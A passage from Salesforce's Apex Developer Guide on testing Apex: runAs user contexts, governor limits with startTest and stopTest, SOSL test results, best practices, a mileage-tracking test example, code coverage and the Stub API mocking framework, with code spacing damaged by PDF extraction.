[SELECTApexClass.Name,Status,ExtendedStatus
FROMApexTestQueueItem
WHEREParentJobId=:jobId];
for (ApexTestQueueItemitem: items){
StringextStatus= item.extendedstatus== null? '' : item.extendedStatus;
System.debug(item.ApexClass.Name+ ': ' + item.Status+ extStatus);
}
}
// Get the resultfor eachtestmethodthatwas executed.
publicstaticvoidcheckMethodStatus(ID jobId){
ApexTestResult[]results=
[SELECTOutcome,ApexClass.Name,MethodName,Message,StackTrace
FROMApexTestResult
WHEREAsyncApexJobId=:jobId];
for (ApexTestResultatr : results){
System.debug(atr.ApexClass.Name+ '.' + atr.MethodName+ ': ' + atr.Outcome);
721
Testing ApexApex Developer Guide

if (atr.message!= null) {
System.debug(atr.Message+ '\n at ' + atr.StackTrace);
}
}
}
}
1.Using the runAs Method
Generally, all Apex code runs in system mode, where the object-level and field-level permissions of the current user aren’t taken into
account. With the System method runAs, you can write test methods that change the user context to an existing user or a new
user. Then the user’s sharing rules and object-level and field-level permissions are enforced.
2.Using Limits, startTest, and stopTest
3.Adding SOSL Queries to Unit Tests
SEE ALSO:
Testing and Code Coverage
Salesforce Help: Open the Developer Console
Using the runAs Method
Generally, all Apex code runs in system mode, where the object-level and field-level permissions of the current user aren’t taken into
account. With the System method runAs, you can write test methods that change the user context to an existing user or a new user.
Then the user’s sharing rules and object-level and field-level permissions are enforced.
Note: The user’s sharing rules and object-level and field-level permissions are enforced within a runAs block, regardless of the
sharing mode (withsharing or withoutsharing) of the test class.
If a user-defined method is called in the runAs block, the sharing mode enforced is that of the class where the method is defined,
not the test class.
You can use runAs only in test methods. The original system context is started again after all runAs test methods complete.
The runAs method ignores user license limits. You can create users with runAs even if your organization has no additional user
licenses.
Note:  Every call to runAs counts against the total number of DML statements issued in the process.
In the following example, a new test user is created, then code is run as that user, with that user's record sharing access:
@isTest
privateclassTestRunAs{
publicstatictestMethodvoidtestRunAs(){
// Setuptestdata
// Createa uniqueUserName
StringuniqueUserName= 'standarduser'+ DateTime.now().getTime()+ '@testorg.com';
// Thiscoderunsas the systemuser
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
Useru = new User(Alias= 'standt', Email='standarduser@testorg.com',
EmailEncodingKey='UTF-8', LastName='Testing', LanguageLocaleKey='en_US',
722
Testing ApexApex Developer Guide

LocaleSidKey='en_US', ProfileId= p.Id,
TimeZoneSidKey='America/Los_Angeles',
UserName=uniqueUserName);
System.runAs(u){
// The followingcoderunsas user'u'
System.debug('CurrentUser:' + UserInfo.getUserName());
System.debug('CurrentProfile:' + UserInfo.getProfileId());
}
}
}
You can nest more than one runAs method. For example:
@isTest
privateclassTestRunAs2{
publicstatictestMethodvoidtest2(){
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
Useru2 = new User(Alias= 'newUser', Email='newuser@testorg.com',
EmailEncodingKey='UTF-8', LastName='Testing', LanguageLocaleKey='en_US',
LocaleSidKey='en_US', ProfileId= p.Id,
TimeZoneSidKey='America/Los_Angeles', UserName='newuser@testorg.com');
System.runAs(u2){
// The followingcoderunsas useru2.
System.debug('CurrentUser:' + UserInfo.getUserName());
System.debug('CurrentProfile:' + UserInfo.getProfileId());
// The followingcoderunsas useru3.
Useru3 = [SELECTId FROMUserWHEREUserName='newuser@testorg.com'];
System.runAs(u3){
System.debug('CurrentUser:' + UserInfo.getUserName());
System.debug('CurrentProfile:' + UserInfo.getProfileId());
}
// Any additionalcodeherewouldrun as useru2.
}
}
}
Other Uses of runAs
You can also use the runAs method to perform mixed DML operations in your test by enclosing the DML operations within the runAs
block. In this way, you bypass the mixed DML error that is otherwise returned when inserting or updating setup objects together with
other sObjects. See sObjects That Cannot Be Used Together in DML Operations.
723
Testing ApexApex Developer Guide

There’s another overload of the runAs method (runAs(System.Version)) that takes a package version as an argument. This
method causes the code of a specific version of a managed package to be used. For information on using the runAs method and
specifying a package version context, see Testing Behavior in Package Versions on page 756.
SEE ALSO:
Enforce Sharing Rules
Enforce Object and Field Permissions
Apex Reference Guide: System.runAs(userSObject)
Using Limits, startTest, and stopTest
The Limits methods return the specific limit for the particular governor, such as the number of calls of a method or the amount of heap
size remaining.
Each method has two versions. The first version returns the amount of the resource that has been used in the current context. The second
version contains the word “limit” and returns the total amount of the resource that is available for that context. For example,
getCallouts returns the number of callouts to an external service that have already been processed in the current context, while
getLimitCallouts returns the total number of callouts available in the given context.
In addition to the Limits methods, use the startTest and stopTest methods to validate how close the code is to reaching
governor limits.
The startTest method marks the point in your test code when your test actually begins. Each test method is allowed to call this
method only once. All of the code before this method should be used to initialize variables, populate data structures, and so on, allowing
you to set up everything you need to run your test. Any code that executes after the call to startTest and before stopTest is
assigned a new set of governor limits.
The startTest method does not refresh the context of the test: it adds a context to your test. For example, if your class makes 98
SOQL queries before it calls startTest, and the first significant statement after startTest is a DML statement, the program can
now make an additional 100 queries. Once stopTest is called, however, the program goes back into the original context, and can
only make 2 additional SOQL queries before reaching the limit of 100.
The stopTest method marks the point in your test code when your test ends. Use this method in conjunction with the startTest
method. Each test method is allowed to call this method only once. Any code that executes after the stopTest method is assigned
the original limits that were in effect before startTest was called. All asynchronous calls made after the startTest method are
collected by the system. When stopTest is executed, all asynchronous processes are run synchronously. An exception encountered
during stopTest halts the synchronous processing. For example, an unhandled exception in a batch job’s execute method will
prevent the finish method from running in a test context.
SEE ALSO:
Test Apex Triggers
Adding SOSL Queries to Unit Tests
To ensure that test methods always behave in a predictable way, any Salesforce Object Search Language (SOSL) query that is added to
an Apex test method returns an empty set of search results when the test method executes. If you do not want the query to return an
empty list of results, you can use the Test.setFixedSearchResults system method to define a list of record IDs that are
returned by the search. All SOSL queries that take place later in the test method return the list of record IDs that were specified by the
Test.setFixedSearchResults method. Additionally, the test method can call Test.setFixedSearchResults
multiple times to define different result sets for different SOSL queries. If you do not call the Test.setFixedSearchResults
724
Testing ApexApex Developer Guide

method in a test method, or if you call this method without specifying a list of record IDs, any SOSL queries that take place later in the
test method return an empty list of results.
The list of record IDs specified by the Test.setFixedSearchResults method replaces the results that would normally be
returned by the SOSL query if it were not subject to any WHERE or LIMIT clauses. If these clauses exist in the SOSL query, they are
applied to the list of fixed search results. For example:
@isTest
privateclassSoslFixedResultsTest1{
publicstatictestMethodvoidtestSoslFixedResults(){
Id [] fixedSearchResults=new Id[1];
fixedSearchResults[0]= '001x0000003G89h';
Test.setFixedSearchResults(fixedSearchResults);
List<List<SObject>>searchList= [FIND'test'
IN ALL FIELDSRETURNING
Account(id,nameWHEREname= 'test'LIMIT
1)];
}
}
Note:  SOSL queries for ContentDocument (File) or ContentNote (Note) entities require using
setFixedSearchResults with ContentVersion IDs to remain consistent with how Salesforce indexes and searches
for files and notes.
Although the account record with an ID of 001x0000003G89h may not match the query string in the FIND clause ('test'), the
record is passed into the RETURNING clause of the SOSL statement. If the record with ID 001x0000003G89h matches the WHERE
clause filter, the record is returned. If it does not match the WHERE clause, no record is returned.
Testing Best Practices
Good tests do the following:
•
Cover as many lines of code as possible. Before you can deploy Apex or package it for AppExchange, the following must be true.
Important:
–
Unit tests must cover at least 75% of your Apex code, and all of those tests must complete successfully.
Note the following.
•
When deploying Apex to a production organization, each unit test in your organization namespace is executed by
default.
•
Calls to System.debug aren’t counted as part of Apex code coverage.
•
Test methods and test classes aren’t counted as part of Apex code coverage.
•
While only 75% of your Apex code must be covered by tests, don’t focus on the percentage of code that is covered.
Instead, make sure that every use case of your application is covered, including positive and negative cases, as well as
bulk and single records. This approach ensures that 75% or more of your code is covered by unit tests.
•
Tests don’t run in parallel in metadata deployments, package installations, or change set deployments.
–
Every trigger must have some test coverage.
–
All classes and triggers must compile successfully.
•
If code uses conditional logic (including ternary operators), execute each branch.
725
Testing ApexApex Developer Guide

•
Make calls to methods using both valid and invalid inputs.
•
Complete successfully without throwing any exceptions, unless those errors are expected and caught in a try...catch block.
•
Always handle all exceptions that are caught, instead of merely catching the exceptions.
•
Use the methods of the Assert class to prove that the code behaves properly.
•
Use the runAs method to test your application in different user contexts.
•
Exercise bulk trigger functionality—use at least 20 records in your tests.
•
Use the ORDERBY keywords to ensure that the records are returned in the expected order.
•
Not assume that record IDs are in sequential order.
Record IDs aren’t created in ascending order unless you insert multiple records with the same request. For example, if you create an
account A, and receive the ID 001D000000IEEmT, then create account B, the ID of account B need not be sequentially higher.
•
Set up test data:
–
Create the necessary data in test classes, so the tests don’t have to rely on data in a particular organization.
–
Create all test data before calling the Test.startTest method.
–
Since tests don't commit, you don't have to delete any data.
•
Write comments stating not only what must be tested, but the assumptions the tester made about the data, the expected outcome,
and so on.
•
Test the classes in your application individually. Never test your entire application in a single test.
Note:  To protect the privacy of your data, make sure that test error messages and exception details don’t contain any personal
data. The Apex exception handler and testing framework can’t determine if sensitive data is contained in user-defined messages
and details. To include personal data in custom Apex exceptions, we recommend that you create an Exception subclass with new
properties that holds the personal data. Then, don’t include subclass property information in the exception's message string.
If you’re running many tests, test the classes in your organization individually in the Salesforce user interface instead of using the Run
All Tests button to run them all together.
Best Practices for Parallel Test Execution
Tests that are started from the Salesforce user interface (including the Developer Console) run in parallel. Parallel test execution can
speed up test run time. Sometimes, parallel test execution results in data contention issues, and you can turn off parallel execution in
those cases. In particular, data contention issues and UNABLE_TO_LOCK_ROW errors can occur in the following cases:
•
When tests update the same records at the same time. Updating the same records typically occurs when tests don’t create their
own data and turn off data isolation to access the organization’s data.
•
When a deadlock occurs in tests that are running in parallel and that try to create records with duplicate index field values. A deadlock
occurs when two running tests are waiting for each other to roll back data. Such a wait can happen if two tests insert records with
the same unique index field values.
You can prevent receiving those errors by turning off parallel test execution in the Salesforce user interface:
1.From Setup, enter ApexTest.
2.Click Options....
3.In the Apex Test Execution Options dialog, select Disable Parallel Apex Testing and then click OK.
726
Testing ApexApex Developer Guide

Test classes annotated with IsTest(IsParallel=true) indicate that the test class can run concurrently with more than the
default number of concurrent test classes. This annotation overrides default settings.
SEE ALSO:
Code Coverage Best Practices
Testing Example
The following example includes cases for the following types of tests:
•
Positive case with single and multiple records
•
Negative case with single and multiple records
•
Testing with other users
The test is used with a simple mileage tracking application. The existing code for the application verifies that not more than 500 miles
are entered in a single day. The primary object is a custom object named Mileage__c. The test creates one record with 300 miles and
verifies there are only 300 miles recorded. Then a loop creates 200 records with one mile each. Finally, it verifies there are 500 miles
recorded in total (the original 300 plus the new ones). Here’s the entire test class. The following sections step through specific portions
of the code.
@isTest
privateclassMileageTrackerTestSuite{
statictestMethodvoidrunPositiveTestCases(){
DoubletotalMiles= 0;
finalDoublemaxtotalMiles= 500;
finalDoublesingletotalMiles= 300;
finalDoubleu2Miles= 100;
//Setup user
Useru1 = [SELECTId FROMUserWHEREAlias='auser'];
//RunAs U1
System.RunAs(u1){
System.debug('Inserting300miles...(singlerecordvalidation)');
Mileage__ctestMiles1= new Mileage__c(Miles__c= 300,Date__c= System.today());
inserttestMiles1;
//Validatesingleinsert
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :u1.id
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
Assert.areEqual(singletotalMiles,totalMiles);
727
Testing ApexApex Developer Guide

//Bulkvalidation
totalMiles= 0;
System.debug('Inserting200 mileagerecords...(bulkvalidation)');
List<Mileage__c>testMiles2= new List<Mileage__c>();
for(integeri=0;i<200;i++){
testMiles2.add(new Mileage__c(Miles__c= 1, Date__c= System.today()));
}
inserttestMiles2;
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :u1.Id
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
Assert.areEqual(maxtotalMiles,totalMiles);
}//endRunAs(u1)
//Validateadditionaluser:
totalMiles= 0;
//SetupRunAs
Useru2 = [SELECTId FROMUserWHEREAlias='tuser'];
System.RunAs(u2){
Mileage__ctestMiles3= new Mileage__c(Miles__c= 100,Date__c= System.today());
inserttestMiles3;
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :u2.Id
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
//Validate
Assert.areEqual(u2Miles,totalMiles);
} //System.RunAs(u2)
} // runPositiveTestCases()
statictestMethodvoidrunNegativeTestCases(){
Useru3 = [SELECTId FROMUserWHEREAlias='tuser'];
System.RunAs(u3){
System.debug('Insertinga recordwith501 miles...(negativetestcase)');
728
Testing ApexApex Developer Guide

Mileage__ctestMiles3= new Mileage__c(Miles__c= 501,Date__c= System.today()
);
try {
inserttestMiles3;
Assert.fail('DmlExceptionexpected');
} catch(DmlExceptione) {
//AssertStatusCode
Assert.areEqual('FIELD_CUSTOM_VALIDATION_EXCEPTION', e.getDmlStatusCode(0));
//Assertfield
Assert.areEqual(Mileage__c.Miles__c,e.getDmlFields(0)[0]);
//AssertErrorMessage
Assert.isTrue(e.getMessage().contains(
'Mileagerequestexceedsdailylimit(500):[Miles__c]'),
'DMLExceptiondid not containexpectedvalidationmessage:'+ e.getMessage()
);
} //catch
} //RunAs(u3)
} // runNegativeTestCases()
} // classMileageTrackerTestSuite
Positive Test Case
The following steps through the above code, in particular, the positive test case for single and multiple records.
1.Add text to the debug log, indicating the next step of the code:
System.debug('Inserting300 moremiles...singlerecordvalidation');
2.Create a Mileage__c object and insert it into the database.
Mileage__ctestMiles1= new Mileage__c(Miles__c= 300,Date__c= System.today());
inserttestMiles1;
3.Validate the code by returning the inserted records:
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :createdbyId
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
4.Use the Assert.areEqual method to verify that the expected result is returned:
Assert.areEqual(singletotalMiles,totalMiles);
729
Testing ApexApex Developer Guide

5.Before moving to the next test, set the number of total miles back to 0:
totalMiles= 0;
6.Validate the code by creating a bulk insert of 200 records.
First, add text to the debug log, indicating the next step of the code:
System.debug('Inserting200 Mileagerecords...bulkvalidation');
7.Then insert 200 Mileage__c records:
List<Mileage__c>testMiles2= new List<Mileage__c>();
for(Integeri=0;i<200;i++){
testMiles2.add(new Mileage__c(Miles__c= 1, Date__c= System.today()));
}
inserttestMiles2;
8.Use Assert.areEqual to verify that the expected result is returned:
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :CreatedbyId
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
Assert.areEqual(maxtotalMiles,totalMiles);
Negative Test Case
The following steps through the above code, in particular, the negative test case.
1.Create a static test method called runNegativeTestCases:
statictestMethodvoidrunNegativeTestCases(){
2.Add text to the debug log, indicating the next step of the code:
System.debug('Inserting501 miles...negativetestcase');
3.Create a Mileage__c record with 501 miles.
Mileage__ctestMiles3= new Mileage__c(Miles__c= 501,Date__c= System.today());
4.Place the insert statement within a try/catch block. This allows you to catch the validation exception and assert the generated
error message. Use the Assert.fail method to clearly assert that you expect the validation exception.
try {
inserttestMiles3;
Assert.fail('DmlExceptionexpected');
} catch(DmlExceptione) {
730
Testing ApexApex Developer Guide

5.Now use the Assert.areEqual and Assert.isTrue methods to do the testing. Add the following code to the catch
block you previously created:
//AssertStatusCode
Assert.areEqual('FIELD_CUSTOM_VALIDATION_EXCEPTION', e.getDmlStatusCode(0));
//Assertfield
Assert.areEqual(Mileage__c.Miles__c,e.getDmlFields(0)[0]);
//AssertErrorMessage
Assert.isTrue(e.getMessage().contains(
'Mileagerequestexceedsdailylimit(500):[Miles__c]'),
'DMLExceptiondid not containexpectedvalidationmessage:'+ e.getMessage());
Testing as a Second User
The following steps through the above code, in particular, running as a second user.
1.Before moving to the next test, set the number of total miles back to 0:
totalMiles= 0;
2.Set up the next user.
Useru2 = [SELECTId FROMUserWHEREAlias='tuser'];
System.RunAs(u2){
3.Add text to the debug log, indicating the next step of the code:
System.debug('Settingup testing- deletingany mileagerecordsfor ' +
UserInfo.getUserName()+
' fromtoday');
4.Then insert one Mileage__c record:
Mileage__ctestMiles3= new Mileage__c(Miles__c= 100,Date__c= System.today());
inserttestMiles3;
5.Validate the code by returning the inserted records:
for(Mileage__cm:[SELECTmiles__cFROMMileage__c
WHERECreatedDate= TODAY
and CreatedById= :u2.Id
and miles__c!= null]) {
totalMiles+= m.miles__c;
}
6.Use the Assert.areEqual method to verify that the expected result is returned:
Assert.areEqual(u2Miles,totalMiles);
731
Testing ApexApex Developer Guide

Testing and Code Coverage
The Apex testing framework generates code coverage numbers for your Apex classes and triggers every time you run one or more tests.
Code coverage indicates how many executable lines of code in your classes and triggers have been exercised by test methods. Write
test methods to test your triggers and classes, and then run those tests to generate code coverage information.
Apex Trigger and Class Covered by Test Methods
In addition to ensuring the quality of your code, unit tests enable you to meet the code coverage requirements for deploying or packaging
Apex. To deploy Apex or package it for the Salesforce AppExchange, unit tests must cover at least 75% of your Apex code, and those
tests must pass.
Code coverage serves as one indication of test effectiveness, but doesn’t guarantee test effectiveness. The quality of the tests also matters,
but you can use code coverage as a tool to assess whether you need to add more tests. While you need to meet minimum code coverage
requirements for deploying or packaging your Apex code, code coverage shouldn’t be the only goal of your tests. Tests should assert
your app’s behavior and ensure the quality of your code.
How Is Code Coverage Calculated?
Code coverage percentage is a calculation of the number of covered lines divided by the sum of the number of covered lines and
uncovered lines. Only executable lines of code are included. (Comments and blank lines aren’t counted.) System.debug() statements
and curly brackets are excluded when they appear alone on one line. Multiple statements on one line are counted as one line for the
purpose of code coverage. If a statement consists of multiple expressions that are written on multiple lines, each line is counted for code
coverage.
The following is an example of a class with one method. The tests for this class have been run, and the option to show code coverage
was chosen for this class in the Developer Console. The blue lines represent the lines that are covered by tests. The lines that aren’t
highlighted are left out of the code coverage calculation. The red lines show the lines that weren’t covered by tests. To achieve full
coverage, more tests are needed. The tests must call getTaskPriority() with different inputs and verify the returned value.
This is the class that is partially covered by test methods. The corresponding test class isn’t shown.
732
Testing ApexApex Developer Guide

Test classes (classes that are annotated with @isTest) are excluded from the code coverage calculation. This exclusion applies to all
test classes regardless of what they contain—test methods or utility methods used for testing.
Note:  The Apex compiler sometimes optimizes expressions in a statement. For example, if multiple string constants are concatenated
with the + operator, the compiler replaces those expressions with one string constant internally. If the string concatenation
expressions are on separate lines, the additional lines aren’t counted as part of the code coverage calculation after optimization.
To illustrate this point, a string variable is assigned to two string constants that are concatenated. The second string constant is
on a separate line.
Strings = 'Hello'
+ ' World!';
The compiler optimizes the string concatenation and represents the string as one string constant internally. The second line in
this example is ignored for code coverage.
Strings = 'HelloWorld!';
Inspecting Code Coverage
After running tests, you can view code coverage information in the Tests tab of the Developer Console. The code coverage pane includes
coverage information for each Apex class and the overall coverage for all Apex code in your organization.
Also, code coverage is stored in two Lightning Platform Tooling API objects: ApexCodeCoverageAggregate and ApexCodeCoverage.
ApexCodeCoverageAggregate stores the sum of covered lines for a class after checking all test methods that test it. ApexCodeCoverage
stores the lines that are covered and uncovered by each individual test method. For this reason, a class can have multiple coverage
results in ApexCodeCoverage—one for each test method that has tested it. You can query these objects by using SOQL and the Tooling
API to retrieve coverage information. Using SOQL queries with Tooling API is an alternative way of checking code coverage and a quick
way to get more details.
733
Testing ApexApex Developer Guide

For example, this SOQL query gets the code coverage for the TaskUtil class. The coverage is aggregated from all test classes that
exercised the methods in this class.
SELECTApexClassOrTrigger.Name,NumLinesCovered,NumLinesUncovered
FROMApexCodeCoverageAggregate
WHEREApexClassOrTrigger.Name= 'TaskUtil'
Note:  This SOQL query requires the Tooling API. You can run this query by using the Query Editor in the Developer Console and
checking Use Tooling API.
Here’s a sample query result for a class that’s partially covered by tests:
NumLinesUncoveredNumLinesCoveredApexClassOrTrigger.Name
28TaskUtil
This next example shows how you can determine which test methods covered the class. The query gets coverage information from a
different object, ApexCodeCoverage, which stores coverage information by test class and method.
SELECTApexTestClass.Name,TestMethodName,NumLinesCovered,NumLinesUncovered
FROMApexCodeCoverage
WHEREApexClassOrTrigger.Name= 'TaskUtil'
Here’s a sample query result.
NumLinesUncoveredNumLinesCoveredTestMethodNameApexTestClass.Name
37testTaskPriorityTaskUtilTest
46testTaskHighPriorityTaskUtilTest
Note:  If a single deployment has over 2,000 Apex classes, ApexCodeCoverage objects for the deployed classes are deleted even
if the deployment fails or is rolled back.ApexCodeCoverageAggregate objects aren’t affected.
The NumLinesUncovered values in ApexCodeCoverage differ from the corresponding value for the aggregate result in
ApexCodeCoverageAggregate because they represent the coverage related to one test method each. For example, test method
testTaskPriority() covered 7 lines in the entire class out of a total of 10 coverable lines, so the number of uncovered lines
with regard to testTaskPriority() is 3 lines (10–7). Because the aggregate coverage stored in ApexCodeCoverageAggregate
includes coverage by all test methods, the coverage of testTaskPriority() and testTaskHighPriority() is included,
which leaves only 2 lines that are not covered by any test methods.
Code Coverage Best Practices
Consider the following code coverage tips and best practices.
Code Coverage General Tips
•
Run tests to refresh code coverage numbers. Code coverage numbers aren't refreshed when updates are made to Apex code in the
organization unless tests are rerun.
•
If the organization has been updated since the last test run, the code coverage estimate can be incorrect. Rerun Apex tests to get a
correct estimate.
734
Testing ApexApex Developer Guide

•
The overall code coverage percentage in your organization doesn’t include code coverage from package-related tests. The only
exception is when package tests cause your triggers to fire. For more information, see Managed and Unlocked Package Tests.
•
Coverage is based on the total number of code lines in the organization. Adding or deleting lines of code changes the coverage
percentage. For example, let's say an organization has 50 lines of code covered by test methods. If you add a trigger that has 50 lines
of code not covered by tests, the code coverage percentage drops from 100% to 50%. The trigger increases the total code lines in
the organization from 50 to 100, of which only 50 are covered by tests.
Why Code Coverage Numbers Differ Between Sandbox and Production
When Apex is deployed to production or uploaded as part of a package to the Salesforce AppExchange, Salesforce runs local tests in
the destination organization. Sandbox and production environments often don’t contain the same data and metadata, so the code
coverage results don’t always match. If code coverage is less than 75% in production, increase the coverage to be able to deploy or
upload your code. The following are common causes for the discrepancies in code coverage numbers between your development or
sandbox environment and production. This information can help you troubleshoot and reconcile those differences.
Test Failures
If the test results in one environment are different, the overall code coverage percentage doesn’t match. Before comparing code
coverage numbers between sandbox and production, make sure that all tests for the code that you’re deploying or packaging pass
in your organization first. The tests that contribute to the code coverage calculation must all pass before deployment or a package
upload.
Data Dependencies
If your tests access organization data by using the @IsTest(SeeAllData=true) annotation, the test results can differ
depending on which data is available in the organization. If the records referenced in a test don’t exist or have changed, the test fails
or different code paths are executed in the Apex methods. Modify tests so that they create test data instead of accessing organization
data.
Metadata Dependencies
Changes in the metadata, such as changes in the user’s profile settings, can cause tests to fail or execute different code paths. Make
sure that the metadata in sandbox and production match, or ensure that the metadata changes aren’t the cause of different test
execution behavior.
Managed and Unlocked Package Tests
Code coverage that is computed after you run all Apex tests in the user interface, such as the Developer Console, can differ from
code coverage obtained in a deployment. If you run all tests, including package-related tests, in the user interface, the overall code
coverage in your organization doesn’t include coverage for packaging code. Although package-related tests cover lines of code in
managed or unlocked packages, this coverage isn’t part of the organization’s code coverage calculation as total lines and covered
lines. In contrast, the code coverage computed in a deployment after running all tests through the RunAllTestsInOrg test
level includes coverage of package-related code. If you’re running package tests in a deployment through the RunAllTestsInOrg
test level, we recommend that you run this deployment in a sandbox first or perform a validation deployment to verify code coverage.
Deployment Resulting in Overall Coverage Lower Than 75%
When deploying new components that have 100% coverage to production, the deployment fails if the average coverage between
the new and existing code doesn’t meet the 75% threshold. If a test run in the destination organization returns a coverage result of
less than 75%, modify the existing test methods or write additional test methods to raise the code coverage over 75%. Deploy the
modified or new test methods separately or with your new code that has 100% coverage.
Code Coverage in Production Dropping Below 75%
Sometimes the overall coverage in production drops below 75%, even though it was at least 75% when the components were
deployed from sandbox. Test methods that have dependencies on the organization’s data and metadata can cause a drop in code
coverage. If the data and metadata have changed sufficiently to alter the result of dependent test methods, some methods can fail
or behave differently. In that case, certain lines are no longer covered.
735
Testing ApexApex Developer Guide

Recommended Process for Matching Code Coverage Numbers for Production
•
Use a Full Sandbox as the staging sandbox environment for production deployments. A Full Sandbox mimics the metadata and data
in production and helps reduce differences in code coverage numbers between the two environments.
•
To reduce dependencies on data in sandbox and production organizations, use test data in your Apex tests.
•
If a deployment to production fails due to insufficient code coverage, write more tests to raise the overall code coverage to the
highest possible coverage or 100%. Retry the deployment.
•
If a deployment to production fails even after you raise code coverage numbers in sandbox, run local tests from your production
organization. Identify the classes with less than 75% coverage. Write additional tests for these classes in sandbox to raise the code
coverage.
Build a Mocking Framework with the Stub API
Apex provides a stub API for implementing a mocking framework. A mocking framework has many benefits. It can streamline and
improve testing and help you create faster, more reliable tests. You can use it to test classes in isolation, which is important for unit
testing. Building your mocking framework with the stub API can also be beneficial because stub objects are generated at runtime.
Because these objects are generated dynamically, you don’t have to package and deploy test classes. You can build your own mocking
framework, or you can use one built by someone else.
You can define the behavior of stub objects, which are created at runtime as anonymous subclasses of Apex classes. The stub API
comprises the System.StubProvider interface and the System.Test.createStub() method.
Note:  This feature is intended for advanced Apex developers. Using it requires a thorough understanding of unit testing and
mocking frameworks.
Let’s look at an example to illustrate how the stub API works. This example isn’t meant to demonstrate the wide range of possible uses
for mocking frameworks. It’s intentionally simple to focus on the mechanics of using the Apex stub API.
Let’s say we want to test the formatting method in the following class.
publicclassDateFormatter{
// Methodto test
publicStringgetFormattedDate(DateHelperhelper){
return'Today\'sdateis ' + helper.getTodaysDate();
}
}
Usually, when we invoke this method, we pass in a helper class that has a method that returns today’s date.
publicclassDateHelper{
// Methodto stub
publicStringgetTodaysDate(){
returnDate.today().format();
}
}
The following code invokes the method.
DateFormatterdf = new DateFormatter();
DateHelperdh = new DateHelper();
StringdateStr= df.getFormattedDate(dh);
For testing, we want to isolate the getFormattedDate() method to make sure that the formatting is working properly. The return
value of the getTodaysDate() method normally varies based on the day. However, in this case, we want to return a constant,
predictable value to isolate our testing to the formatting. Rather than writing a “fake” version of the class, where the method returns a
736
Testing ApexApex Developer Guide

constant value, we create a stub version of the class. The stub object is created dynamically at runtime, and we can specify the “stubbed”
behavior of its method.
To use a stub version of an Apex class:
1.Define the behavior of the stub class by implementing the System.StubProvider interface.
2.Instantiate a stub object by using the System.Test.createStub() method.
3.Invoke the relevant method of the stub object from within a test class.
Implement the StubProvider Interface
Here’s an implementation of the StubProvider interface.
@isTest
publicclassMockProviderimplementsSystem.StubProvider{
publicObjecthandleMethodCall(ObjectstubbedObject,StringstubbedMethodName,
TypereturnType,List<Type>listOfParamTypes,List<String> listOfParamNames,
List<Object> listOfArgs){
// The followingdebugstatementsshowan exampleof logging
// the invocationof a mockedmethod.
// You can use the methodnameand returntypeto determinewhichmethodwas called.
System.debug('Nameof stubbedmethod:' + stubbedMethodName);
System.debug('Returntypeof stubbedmethod:' + returnType.getName());
// You can alsouse the parameternamesand typesto determinewhichmethod
// was called.
for (integeri =0; i < listOfParamNames.size();i++){
System.debug('parametername:' + listOfParamNames.get(i));
System.debug('  parametertype:' + listOfParamTypes.get(i).getName());
}
// Thisshowsthe actualparametervaluespassedintothe stubbedmethodat runtime.
System.debug('numberof parameterspassedintothe mockedcall:' +
listOfArgs.size());
System.debug('parameter(s)sentintothe mockedcall:' + listOfArgs);
// Thisis a verysimplemockproviderthatreturnsa hard-codedvalue
// basedon the returntypeof the invoked.
if (returnType.getName()== 'String')
return'8/8/2016';
else
returnnull;
}
}
StubProvider is a callback interface. It specifies a single method that requires implementing: handleMethodCall(). When
a stubbed method is called, handleMethodCall() is called. You define the behavior of the stubbed class in this method. The
method has the following parameters.
•
stubbedObject: The stubbed object
737
Testing ApexApex Developer Guide

•
stubbedMethodName: The name of the invoked method
•
returnType: The return type of the invoked method
•
listOfParamTypes: A list of the parameter types of the invoked method
•
listOfParamNames: A list of the parameter names of the invoked method
•
listOfArgs: The actual argument values passed into this method at runtime
You can use these parameters to determine which method of your class was called, and then you can define the behavior for each
method. In this case, we check the return type of the method to identify it and return a hard-coded value.
Instantiate a Stub Version of the Class
The next step is to instantiate a stub version of the class. The following utility class returns a stub object that you can use as a mock.
publicclassMockUtil{
privateMockUtil(){}
publicstaticMockProvidergetInstance(){
returnnew MockProvider();
}
publicstaticObjectcreateMock(TypetypeToMock){
// Invokethe stubAPI and passit our mockproviderto createa
// mockclassof typeToMock.
returnTest.createStub(typeToMock,MockUtil.getInstance());
}
}
This class contains the method createMock(), which invokes the Test.createStub() method. The createStub()
method takes an Apex class type and an instance of the StubProvider interface that we created previously. It returns a stub object
that we can use in testing.
Invoke the Stub Method
Finally, we invoke the relevant method of the stub class from within a test class.
@isTest
publicclassDateFormatterTest{
@isTest
publicstaticvoidtestGetFormattedDate(){
// Createa mockversionof the DateHelperclass.
DateHelpermockDH= (DateHelper)MockUtil.createMock(DateHelper.class);
DateFormatterdf = new DateFormatter();
// Use the mockedobjectin the test.
System.assertEquals('Today\'sdateis 8/8/2016', df.getFormattedDate(mockDH));
}
}
In this test, we call the createMock() method to create a stub version of the DateHelper class. We can then invoke the
getTodaysDate() method on the stub object, which returns our hard-coded date. Using the hard-coded date allows us to test
the behavior of the getFormattedDate() method in isolation.
738
Testing ApexApex Developer Guide

Apex Stub API Limitations
Keep the following limitations in mind when working with the Apex stub API.
•
The object being mocked must be in the same namespace as the call to the Test.createStub() method. However, the
implementation of the StubProvider interface can be in another namespace.
•
You can’t mock the following Apex elements.
–
Static methods (including future methods)
–
Private methods
–
Properties (getters and setters)
–
Triggers
–
Inner classes
–
System types
–
Classes that implement the Batchable interface
–
Classes that have only private constructors
•
Iterators can’t be used as return types or parameter types.
SEE ALSO:
StubProvider Interface
Test.createStub()
Deploying Apex
You can't develop Apex in your Salesforce production org. Your development work is done in a sandbox, in a scratch org, or in a Developer
Edition org.
Compile On Deploy
Each org’s Apex code is automatically recompiled before completing a metadata deploy, package install, or package upgrade. Compile
on deploy is enabled automatically for production orgs and full sandboxes to ensure that users don’t experience reduced performance
